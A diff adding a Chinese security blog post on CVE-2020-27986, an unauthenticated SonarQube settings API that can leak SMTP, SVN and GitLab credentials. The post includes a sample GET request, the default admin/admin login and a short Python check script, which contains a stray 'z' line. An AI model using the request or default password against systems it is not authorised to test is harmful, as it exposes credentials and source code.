@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x01 漏洞影响产品概述SonarQube是一款开源静态代码质量分析管理工具，支持Java、Python、PHP、JavaScript、CSS等27种以上目前极为流程的编程开发语言，同时它能够便捷集成在各种IDE、Jenkins、Git等服务中，方便及时查看代码质量分析报告。该工具在github开源社区获得6.3K的关注量，在全球颇具影响力，深得全球各研发工作者的喜爱。 0x02 漏洞描述S">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SonarQube 未授权漏洞">
+<meta property="og:url" content="https://godzeo.github.io/2022/01/29/SonarQube%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Zeo 安全实验室">
+<meta property="og:description" content="0x01 漏洞影响产品概述SonarQube是一款开源静态代码质量分析管理工具，支持Java、Python、PHP、JavaScript、CSS等27种以上目前极为流程的编程开发语言，同时它能够便捷集成在各种IDE、Jenkins、Git等服务中，方便及时查看代码质量分析报告。该工具在github开源社区获得6.3K的关注量，在全球颇具影响力，深得全球各研发工作者的喜爱。 0x02 漏洞描述S">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/73ed19f0832d098e1fadec7c86744e6b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/0ab34a3987898ea588eb48160fc2be5e.png">
+<meta property="article:published_time" content="2022-01-29T06:47:26.000Z">
+<meta property="article:modified_time" content="2022-01-29T07:59:01.756Z">
+<meta property="article:author" content="Zeo">
+<meta property="article:tag" content="WEB安全">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="二进制">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/img_convert/73ed19f0832d098e1fadec7c86744e6b.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>SonarQube 未授权漏洞</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Zeo 安全实验室" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories">分类</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2022/01/26/CVE-2021-4034%20Linux%20Polkit%20pkexec%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://godzeo.github.io/2022/01/29/SonarQube%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://godzeo.github.io/2022/01/29/SonarQube%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/&text=SonarQube 未授权漏洞" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://godzeo.github.io/2022/01/29/SonarQube%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/&title=SonarQube 未授权漏洞" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godzeo.github.io/2022/01/29/SonarQube%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/&is_video=false&description=SonarQube 未授权漏洞" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SonarQube 未授权漏洞&body=Check out this article: https://godzeo.github.io/2022/01/29/SonarQube%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://godzeo.github.io/2022/01/29/SonarQube%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/&title=SonarQube 未授权漏洞" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://godzeo.github.io/2022/01/29/SonarQube%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/&title=SonarQube 未授权漏洞" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://godzeo.github.io/2022/01/29/SonarQube%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/&title=SonarQube 未授权漏洞" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://godzeo.github.io/2022/01/29/SonarQube%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/&title=SonarQube 未授权漏洞" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://godzeo.github.io/2022/01/29/SonarQube%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/&name=SonarQube 未授权漏洞&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://godzeo.github.io/2022/01/29/SonarQube%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/&t=SonarQube 未授权漏洞" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-漏洞影响产品概述"><span class="toc-number">1.</span> <span class="toc-text">0x01 漏洞影响产品概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-漏洞描述"><span class="toc-number">2.</span> <span class="toc-text">0x02 漏洞描述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-影响版本"><span class="toc-number">3.</span> <span class="toc-text">0x03 影响版本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-漏洞验证"><span class="toc-number">4.</span> <span class="toc-text">0x04 漏洞验证</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-漏洞利用EXP"><span class="toc-number">5.</span> <span class="toc-text">0x05 漏洞利用EXP</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        SonarQube 未授权漏洞
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Zeo 安全实验室</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-01-29T06:47:26.000Z" itemprop="datePublished">2022-01-29</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WEB-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">WEB 漏洞复现和分析</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <a id="more"></a>
+
+<h1 id="0x01-漏洞影响产品概述"><a href="#0x01-漏洞影响产品概述" class="headerlink" title="0x01 漏洞影响产品概述"></a><strong>0x01 漏洞影响产品概述</strong></h1><p>SonarQube是一款开源静态代码质量分析管理工具，支持Java、Python、PHP、JavaScript、CSS等27种以上目前极为流程的编程开发语言，同时它能够便捷集成在各种IDE、Jenkins、Git等服务中，方便及时查看代码质量分析报告。该工具在github开源社区获得6.3K的关注量，在全球颇具影响力，深得全球各研发工作者的喜爱。</p>
+<h1 id="0x02-漏洞描述"><a href="#0x02-漏洞描述" class="headerlink" title="0x02 漏洞描述"></a><strong>0x02 漏洞描述</strong></h1><p>SonarQube是一款开源静态代码质量分析管理工具，在默认配置的情况下，缺少对API 接口的访问权限控制，攻击者可利用该漏洞在未授权的情况下，通过访问api/settings/values接口从而获取到 SMTP、SVN、GitLab 凭据，进一步获取源代码数据仓库中的源代码，造成项目源代码泄露。同时还可以对使用默认账号密码的用户进行攻击，系统安装完成后，默认弱口令为admin/admin，攻击者通过输入默认账号密码，同样可以获得敏感配置信息，从而进一步窃取企业源代码。</p>
+<h1 id="0x03-影响版本"><a href="#0x03-影响版本" class="headerlink" title="0x03 影响版本"></a><strong>0x03 影响版本</strong></h1><p>此次受影响 SonarQube 版本如下：</p>
+<table>
+<thead>
+<tr>
+<th>SonarQube版本</th>
+<th>是否受影响</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&lt;8.6</td>
+<td>是</td>
+</tr>
+<tr>
+<td>&gt;=8,6</td>
+<td>否</td>
+</tr>
+</tbody></table>
+<h1 id="0x04-漏洞验证"><a href="#0x04-漏洞验证" class="headerlink" title="0x04 漏洞验证"></a><strong>0x04 漏洞验证</strong></h1><p>直接未授权访问get链接即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;api&#x2F;settings&#x2F;values HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:9000</span><br><span class="line">User-Agent: python-requests&#x2F;2.26.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/73ed19f0832d098e1fadec7c86744e6b.png" alt="image-20211129105637462"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本系统常见的默认口令是 admin&#x2F;admin</span><br></pre></td></tr></table></figure>
+
+<p>得有泄漏敏感信息才能有危害，有些并没有配置的话，危害就没多大了</p>
+<p>比如存在SMTP的密钥</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0ab34a3987898ea588eb48160fc2be5e.png" alt="image-20211129110309056"></p>
+<h1 id="0x05-漏洞利用EXP"><a href="#0x05-漏洞利用EXP" class="headerlink" title="0x05 漏洞利用EXP"></a>0x05 漏洞利用EXP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"># author: Zeo</span><br><span class="line"># python: 3.7 </span><br><span class="line"># datetime:2021&#x2F;11&#x2F;25 3:40 下午</span><br><span class="line"># software: PyCharm</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">文件说明：</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import argparse</span><br><span class="line">import urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">class EXP():</span><br><span class="line">    def __init__(self, args):</span><br><span class="line">        self.name &#x3D; &#39;&#39;&#39;CVE-2020-27986 SonarQube api 未授权访问&#39;&#39;&#39;</span><br><span class="line">        self.url &#x3D; args.url</span><br><span class="line">        self.res &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">    def _attack(self):</span><br><span class="line">        path &#x3D; &#39;&#x2F;api&#x2F;settings&#x2F;values&#39;</span><br><span class="line">        try:</span><br><span class="line">            resp &#x3D; requests.get(self.url+path, timeout&#x3D;10, verify&#x3D;False)</span><br><span class="line">            if resp.status_code &#x3D;&#x3D; 200  and &#39;application&#x2F;json&#39; in resp.headers[&#39;Content-Type&#39;] and &#39;sonaranalyzer-cs.nuget.packageVersion&#39; in resp.text and &#39;sonar.core.id&#39; in resp.text:</span><br><span class="line">                self.res &#x3D; &quot;存在漏洞!&quot;</span><br><span class="line">            else:</span><br><span class="line">                self.res &#x3D; &quot;不存在漏洞!&quot;</span><br><span class="line">        except requests.exceptions.RequestException as e:</span><br><span class="line">            print(&quot;目标连接错误....&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def parseArgs():</span><br><span class="line">    parser &#x3D; argparse.ArgumentParser(description&#x3D;&quot;[Exp]!&quot;,formatter_class&#x3D;argparse.RawDescriptionHelpFormatter)</span><br><span class="line">    group &#x3D; parser.add_mutually_exclusive_group()</span><br><span class="line">    group.add_argument(&quot;-u&quot;, &#39;--url&#39;, help&#x3D;&quot;URL to scan; -u http:&#x2F;&#x2F;example.com&quot;)</span><br><span class="line">    args &#x3D; parser.parse_args()</span><br><span class="line"></span><br><span class="line">    return args</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def output(exp):</span><br><span class="line">    </span><br><span class="line">    # print(f&quot;Name &#123;exp.name&#125;&quot;)</span><br><span class="line">    print(f&quot;URL &#123;exp.url&#125;&quot;)</span><br><span class="line">    print(f&quot;RES &#123;exp.res&#125;&quot;)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    args &#x3D; parseArgs()</span><br><span class="line">    z</span><br><span class="line">    exp &#x3D; EXP(args)</span><br><span class="line">    try:</span><br><span class="line">        exp._attack()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        exp.res &#x3D; &quot;Error&quot;</span><br><span class="line"></span><br><span class="line">    output(exp)</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories">分类</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-漏洞影响产品概述"><span class="toc-number">1.</span> <span class="toc-text">0x01 漏洞影响产品概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-漏洞描述"><span class="toc-number">2.</span> <span class="toc-text">0x02 漏洞描述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-影响版本"><span class="toc-number">3.</span> <span class="toc-text">0x03 影响版本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-漏洞验证"><span class="toc-number">4.</span> <span class="toc-text">0x04 漏洞验证</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-漏洞利用EXP"><span class="toc-number">5.</span> <span class="toc-text">0x05 漏洞利用EXP</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://godzeo.github.io/2022/01/29/SonarQube%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://godzeo.github.io/2022/01/29/SonarQube%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/&text=SonarQube 未授权漏洞" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://godzeo.github.io/2022/01/29/SonarQube%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/&title=SonarQube 未授权漏洞" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godzeo.github.io/2022/01/29/SonarQube%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/&is_video=false&description=SonarQube 未授权漏洞" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SonarQube 未授权漏洞&body=Check out this article: https://godzeo.github.io/2022/01/29/SonarQube%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://godzeo.github.io/2022/01/29/SonarQube%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/&title=SonarQube 未授权漏洞" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://godzeo.github.io/2022/01/29/SonarQube%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/&title=SonarQube 未授权漏洞" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://godzeo.github.io/2022/01/29/SonarQube%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/&title=SonarQube 未授权漏洞" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://godzeo.github.io/2022/01/29/SonarQube%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/&title=SonarQube 未授权漏洞" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://godzeo.github.io/2022/01/29/SonarQube%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/&name=SonarQube 未授权漏洞&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://godzeo.github.io/2022/01/29/SonarQube%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/&t=SonarQube 未授权漏洞" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2022
+    Zeo
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories">分类</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
